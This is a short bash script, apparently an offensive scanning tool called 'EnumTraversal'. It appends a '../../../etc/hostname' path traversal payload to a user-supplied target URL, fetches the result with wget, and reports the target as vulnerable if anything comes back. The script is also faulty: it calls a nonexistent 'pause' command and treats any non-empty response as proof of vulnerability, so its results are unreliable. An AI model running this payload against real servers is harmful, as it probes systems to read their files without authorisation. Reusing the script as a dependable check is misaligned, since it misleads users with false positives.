#!/bin/bash

clear

BannerFunction(){
	echo "		+==================================================+"
	echo "		|			EnumTraversal              |"
	echo "		|	        dTMP3st - Cyber Strike Force	   |"
	echo "		|	   	     Version - 1.0                 |"
	echo "		+==================================================+"
}

if [ "$1" == "" ]; then
    BannerFunction
    echo "Use mode: ./$0 Target"
else
    BannerFunction
    echo ""
    wget $1=../../../etc/hostname -O Validation.txt
    pause 2s
    Validation=$(cat Validation.txt)
    rm Validation.txt
    if [ "$Validation" != "" ]; then
        echo "The application is vulnerable to Path traversal"
    else
        echo "The application is not vulnerable to Path traversal"
    fi
fi